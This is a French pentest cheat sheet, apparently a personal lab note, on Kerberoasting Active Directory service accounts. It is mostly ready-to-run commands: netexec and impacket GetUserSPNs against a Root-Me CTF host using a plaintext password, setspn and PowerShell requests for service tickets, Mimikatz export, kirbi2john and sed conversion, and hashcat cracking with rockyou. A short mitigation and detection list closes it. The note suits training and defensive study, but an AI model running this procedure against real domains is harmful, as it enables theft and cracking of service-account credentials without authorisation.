
> [!tip]
> Besoin d'un compte utilisateur valide
> Check les userSPNs puis demande un TGS


# Linux

## *Netexec*

```bash
nxc ldap ctf05.root-me.org -u pentest -p Pent3st123! --kdcHost ctf05.root-me.org --kerberoasting SPNs.txt
```

## *Impacket* (**avec* *TGT* *en* *cache*)

```bash
impacket-GetUserSPNs -no-pass -k -dc-ip ctf05.root-me.org -dc-host DC-KERBEROAST.ROOTME.local rootme.local/pentest -outputfile SPNs.txt
```

## Crack du hash avec [[HASHCAT]]

```bash
hashcat -m 13100 SPNs /usr/share/wordlists/rockyou.txt
```


# Windows

## 1. SETSPN (NATIF)

### Afficher les SPN

```cmd
setspn.exe -Q */*
```

### Target un user (demande un tgs pour le user)

```powershell-session
Add-Type -AssemblyName System.IdentityModel
```

```powershell-session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### Target tous les users possibles (demande un tgs pour tous les users vulnérables)

```powershell-session
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extraire les tickets forgés avec Mimikatz (en base64)

```cmd-session
base64 /out:true
kerberos::list /export
```

### Mettre le base64 au bon format (supprime les espaces et retour ligne)

```shell-session
echo "<base64 blob>" |  tr -d \\n
```

### Placer le base64 dans un fichier au format kirbi

```shell-session
echo "<base64>" | base64 -d > sqldev.kirbi
```

### Mettre le ticket au format john

```shell-session
kirbi2john.py sqldev.kirbi > crack_file
```

### Puis mettre au format hashcat

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Crack du hash avec Hashcat

```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```



## 2. [[POWERVIEW#KERBEROASTING|Méthode avec POWERVIEW]]

## 3. [[RUBEUS#KERBEROASTING|Méthode avec RUBEUS (DOWNGRADE RC4)]]



---


# MITIGATION & DETECTION


1. Utiliser les gMSA et MSA
2. Logs le nombre anormal de requêtes de TGS (computer Configuration -> Security Settings -> Advanced Audit Policy Configuration -> Audit Policies -> Account Logon -> Audit Kerberos Authentication service )











